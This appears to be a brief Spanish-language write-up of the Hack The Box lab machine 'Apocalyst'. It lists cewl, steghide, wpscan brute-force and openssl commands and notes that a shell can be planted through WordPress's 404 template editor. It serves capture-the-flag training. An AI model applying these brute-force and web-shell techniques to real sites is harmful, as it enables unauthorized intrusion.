---
title: Apocalyst
date: 2022-07-31 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: [cewl, steghide, wpscan, desunix]     # TAG names should always be lowercase
---

Cewl para hacer una lista con las palabras de una página web

```shell 
cewl -h diccionario.txt http://10.10.10.10
```

steghide para buscar información en una imagen
info - para saber si tiene información oculta
extract - extraer la información

```shell 
steghide info image.jpg
steghide extract -sf image.jpg 
```

wpscan para enumerar usuarios y hacer fuerza bruta a wp-login.php

```shell 
wpscan --url http://apocalyst.htb -U falaraki -P list.txt
```

Dentro de wordpress, en appareance y editor se puede modificar la plantilla para el código 404, así le introducimos una shell.


Para crear una contraseña DES(Unix) usamos openssl y podemos ver con hash-identifier para validarlo.

```shell 
openssl passwd 
Password: 
Verifying - Password: 
L2xa6K..ttsbM
```
